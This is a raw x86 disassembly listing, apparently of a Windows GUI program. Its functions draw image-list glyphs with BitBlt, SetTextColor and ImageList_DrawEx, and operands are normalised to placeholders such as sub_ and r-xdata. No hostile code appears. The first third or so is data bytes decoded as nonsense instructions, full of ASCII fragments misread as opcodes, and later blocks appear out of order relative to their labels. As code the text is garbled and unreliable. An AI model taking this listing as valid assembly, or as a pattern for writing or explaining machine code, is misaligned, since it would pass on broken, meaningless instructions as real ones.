imul eax [ ecx + ebp * 2 + 0x4d ] 0x6065646f
mov [ ebx ] es
je r-xdata
add [ eax ] al
inc ecx
or eax 0x6e410700
add [ ecx ] ah
add bh bh
dec esp
rol [ ebx ] 0x1
call sub_42df96
add [ eax ] al
add [ ebx ] 0x0
inc edx
jne r-xdata
add [ edi ] al
inc ebx
imul ebp [ esi + 0x74 ] 0x40103c73
add [ eax + 0x1 ] ch
add bh bh
mov [ edx + 0x10042 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or al [ edi + 0x72 ]
outsd
jne r-xdata
add [ eax + 0x4208000e ] al
add dh bh
sbb al 0xdf
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ 0x6e410700 ] cl
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47050016 ] al
insb
jns r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push eax
add [ eax ] al
insb
mov edx 0x10042
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x0
add al 0x46
insb
popad
je r-xdata
dec ecx
outsb
js r-xdata
add [ eax ] al
add eax [ eax ]
outsb
dec eax
0xa0540042 0x43
daa
add [ edi ] al
inc edx
jne r-xdata
fild [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb al [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
push sub_4298a4
jae r-xdata
fiadd [ ebx ]
cld
mov esp 0x680041
add bh bh
in al dx
adc [ eax ] al
jo r-xdata
add bh bh
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
jo r-xdata
outsb
je r-xdata
[ edx + edi * 4 + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ esi ] al
dec esp
popad
jns r-xdata
add bh bh
pushfd
mov edx 0x10042
add [ 0x70796c47 ] al
lds eax [ ecx ]
pushad
mov ecx 0xb96c0042
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add bh bh
cld
mov ecx 0x10042
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
add al 0x44
outsd
ja r-xdata
add [ edi ] bl
outsb
jae r-xdata
add [ eax ] al
[ eax ]
fld [ ebx ]
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
outsb
je r-xdata
add [ edx + 0x6cff0000 ] bl
fild [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jne r-xdata
fiadd [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax 0x6f460400
outsb
je r-xdata
add ah bh
popad
jo r-xdata
pushad
mov eax [ ebx ]
clc
fld [ ebx ]
sub dh bl
inc ebx
add [ esi + edi * 8 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070012 ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ edx + 0x1 ] dh
add bh bh
xor [ ebx + 0x10042 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
add [ eax ] eax
push esp
mov edx 0x10042
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
outsb
add al 0x0
add [ eax ] al
outsb
je r-xdata
sbb eax [ eax ]
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
0x6cff0000 0x43df
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc ebx
cmp al 0x10
inc eax
add [ ecx + eax ] bh
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
popad
jb r-xdata
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
dec [ eax - 0x21 ]
inc ebx
add [ eax ] dl
fild [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ eax ] cl
push ebx
dec ebp
outsd
jne r-xdata
add [ eax ] al
and [ edx ] 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
arpl [ ecx + 0x6e ] bp
add [ bx + si ] dl
inc eax
add [ eax + 0x1 ] bh
add bh bh
hlt
sbb [ esi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc65646f
aam 0x44
add [ eax + eax ] bh
push [ eax + 0x10043dd ]
push esp
jb r-xdata
adc [ eax ] al
jne r-xdata
push 0x6948776f
outsb
je r-xdata
inc edx
add [ eax + 0x24000000 ] cl
movsb [ edi ] [ esi ]
inc ebx
add [ eax + ebp * 4 + 0x41 ] dl
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add al dh
xor al 0x40
inc esp
outsd
ja r-xdata
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
insb
inc ebx
insb
outsb
je r-xdata
outsb
je r-xdata
imul ebp [ esi + 0x74 ] r-xdata
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
add [ eax ] al
and [ ebx ] 0x0
outsb
jae r-xdata
pop ds
add [ edi ] al
push ebx
jo r-xdata
add bh bh
fdivr [ edx + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc eax
add [ eax ] dh
mov [ 0x540b0042 ] al
push 0x7473694c
nop
in al dx
lahf
inc edx
add [ edi ] al
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
xchg esp eax
lea eax [ ebx ]
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
adc [ eax ] al
push edi
xchg esp eax
std
dec [ ebx - 0x740f7426 ]
inc ebp
or [ eax + 0x33 ] dl
ror [ ebx + 0xdd2e8c6 ] cl
add al [ eax ]
push 0x68636143
mov al 0xa0
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x7473694c
cwde
lahf
inc edx
add al al
movsb [ edi ] [ esi ]
inc ebx
add [ eax + eax ] cl
pop es
inc edx
jne r-xdata
adc al 0xa1
inc edx
add [ edi * 4 - 0x3f43ffbc ] dh
inc esp
add [ esp + edi * 4 + 0x44 ] dh
add [ 0xffffffffa4000041 ] dh
inc ecx
add [ ebp + 0x41 ] al
add [ esi ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax - 0x52 ] ch
inc esp
add [ eax - 0x48 ] ch
inc esp
add [ edi + ebx * 2 - 0x3a8fffbc ] ch
inc esp
add ah bh
lds eax [ eax + eax - 0x10 ]
pushad
inc esp
add [ edx ] cl
push esp
inc edi
insb
jns r-xdata
dec ebp
outsd
jbe r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
dec [ ebx - 0x31d7f2d ]
je r-xdata
add [ eax ] al
add [ eax - 0x17ffbff0 ] ah
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
test [ ebx + 0x540c0042 ] ah
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xa0
inc edx
add [ eax ] dh
je r-xdata
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
sbb al 0x8d
inc ebx
add al ah
add [ eax ] al
jmp eax
pop esi
pop ebx
retn
mov eax esi
call sub_403614
jbe r-xdata
outsb
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x300042a0 ] dh
outsb
jae r-xdata
insb
jns r-xdata
std
mov eax esi
call sub_44af08
test bl bl
jle r-xdata
and dl 0xfc
push 0x5500408d
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
inc edi
insb
jns r-xdata
add [ eax - 0x60 ] bl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x60 ] bl
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x17ffbff0 ] ah
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
xor [ edx + 0x540b0042 ] ah
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_44aeb4
add esp 0xfffffff0
call sub_4035c4
sub_42a0c0
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_44aeb4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_42a114
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44af08
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_42a144
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_414390
mov esi eax
mov eax [ ebx + 0x80 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_41434c
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_44b33c
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_4142a8
sub_42a190
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42a144
mov esi eax
push ebp
mov ecx edi
mov edx esi
mov eax ebx
call sub_44b548
inc [ ebx + 0x84 ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42a1bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_414378
test al al
je r-xdata
pop esi
pop ebx
retn
dec [ ebx + 0x84 ]
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_41434c
sub_42a1ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403270
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_42a230
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_42a260
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ esp ]
push eax
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a0c0
mov ebx eax
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413c88
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413de4
mov ebx eax
cmp ebp [ ebx + 0x34 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ esp ]
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42a2c0
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ eax + 0x4 ]
call sub_413f80
mov eax ebx
call sub_4032a0
sub_42a2f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403270
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov esi eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_42a424
mov [ ebx + 0x1c ] 0x8080
mov [ ebx + 0x20 ] 0x1
xor eax eax
add esp 0xfffffff0
call sub_4035c4
xor edx edx
mov dl al
mov [ ebx + edx * 4 + 0xc ] 0xffffffff
inc eax
cmp al 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a1ec
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_42a384
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4032a0
mov eax esi
call sub_42a3e0
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
mov eax [ rw-data ]
call sub_42a2e4
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
mov eax [ rw-data ]
call sub_4032a0
xor eax eax
mov [ rw-data ] eax
sub_42a3e0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov [ esi + edi * 4 + 0xc ] 0xffffffff
inc ebx
cmp bl 0x4
jne r-xdata
mov edx eax
mov eax [ esi + 0x8 ]
call sub_42a1bc
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_42a2c0
xor eax eax
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
sub_42a424
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp edx esi
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_422764
mov [ ebx + 0x1c ] eax
mov eax ebx
call sub_42a3e0
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_42a454
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_42a3e0
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_422764
mov [ esi + 0x1c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
cmp eax 0x4
jle r-xdata
mov edx eax
mov eax esi
call sub_42a4cc
mov eax 0x1
sub_42a4cc
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jbe r-xdata
mov eax esi
call sub_42a3e0
mov [ esi + 0x20 ] bl
mov edx [ esi + 0x4 ]
mov eax esi
call sub_42a424
sub_42a4f4
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + eax * 4 + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x3
jae r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
or esi eax
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov esi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42aaa3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push esi
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
xor edx edx
xor eax eax
call sub_4129b0
mov eax [ ebp - 0xc ]
call sub_422678
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41dbec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
call sub_421e40
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov bl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x20 ]
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
mov cl bl
inc ecx
imul ecx edi
xor eax eax
mov al bl
imul edi
xor edx edx
call sub_4129b0
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
xor ebx ebx
mov ecx esi
mov edx edi
mov eax [ rw-data ]
call sub_42a260
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a1ec
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_422678
push eax
mov eax [ ebp - 0xc ]
call sub_422678
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41de5c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x38 ] 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx 0x20000000
mov edx [ ebp - 0xc ]
call sub_42a190
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_42a190
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42aa67
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
jbe r-xdata
dec eax
sub al 0x2
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x14 ]
call sub_422678
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41dbec
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
call sub_422734
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_422678
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422678
mov ecx eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41de5c
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4233e8
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_422678
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41dbec
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422678
push eax
mov eax [ ebp - 0x14 ]
call sub_422678
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41de5c
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000014
call sub_41dbec
mov eax [ ebp - 0x18 ]
call sub_41e4e4
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422678
call sub_41e4e4
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x10 ]
call sub_422678
mov eax [ eax + 0x14 ]
mov edx 0x808080
call sub_41dbec
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422678
push eax
mov eax [ ebp - 0x14 ]
call sub_422678
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41de5c
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_41dbec
mov eax [ ebp - 0x18 ]
call sub_41e4e4
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422678
call sub_41e4e4
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_41cf40
push eax
mov eax [ ebp - 0x10 ]
call sub_422678
mov eax [ eax + 0x14 ]
pop edx
call sub_41dbec
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422678
push eax
mov eax [ ebp - 0x14 ]
call sub_422678
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41de5c
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41dbec
mov eax [ ebp - 0x18 ]
call sub_41e4e4
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422678
call sub_41e4e4
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4233e8
mov eax [ ebp - 0xc ]
call sub_422678
mov ebx eax
mov eax [ ebx + 0x14 ]
mov edx 0xff00000f
call sub_41dbec
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_41dfc4
mov eax [ ebx + 0x14 ]
mov edx 0xff000014
call sub_41dbec
push 0x0
mov eax ebx
call sub_41e4e4
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41e4e4
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422678
call sub_41e4e4
push eax
push esi
push edi
push 0x1
push 0x1
mov eax ebx
call sub_41e4e4
push eax
call BitBlt
mov eax [ ebx + 0x14 ]
mov edx 0xff000010
call sub_41dbec
push 0x0
mov eax ebx
call sub_41e4e4
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41e4e4
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422678
call sub_41e4e4
push eax
push esi
push edi
push 0x0
push 0x0
mov eax ebx
call sub_41e4e4
push eax
call BitBlt
mov eax [ ebp - 0x14 ]
call sub_422678
mov eax [ eax + 0xc ]
mov edx 0xffffff
call sub_41d400
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_4233e8
mov eax [ ebp - 0x14 ]
call sub_422678
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41dbec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4032a0
mov eax [ ebp - 0x14 ]
call sub_4032a0
retn
sub_42aacc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0xc ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
je r-xdata
mov edx ebx
mov eax edi
call sub_42a4f4
mov esi eax
call sub_42c584
call sub_42c664
test al al
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
xor edx edx
mov dl [ edi + 0x20 ]
mov ecx edx
cdq
idiv ecx
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
dec bl
je r-xdata
push 0x1
push 0x1fffffff
push 0x1fffffff
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41e4e4
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_44b200
push eax
call ImageList_DrawEx
jmp r-xdata
cmp bl 0x3
jne r-xdata
mov bl 0x5
jmp r-xdata
dec ebx
sub bl 0x2
jb r-xdata
push 0x0
push 0x1fffffff
mov eax 0xff00000f
call sub_41cf40
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41e4e4
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_44b200
push eax
call ImageList_DrawEx
call sub_42c584
lea ecx [ ebp - 0x14 ]
mov edx ebx
call sub_42c8c8
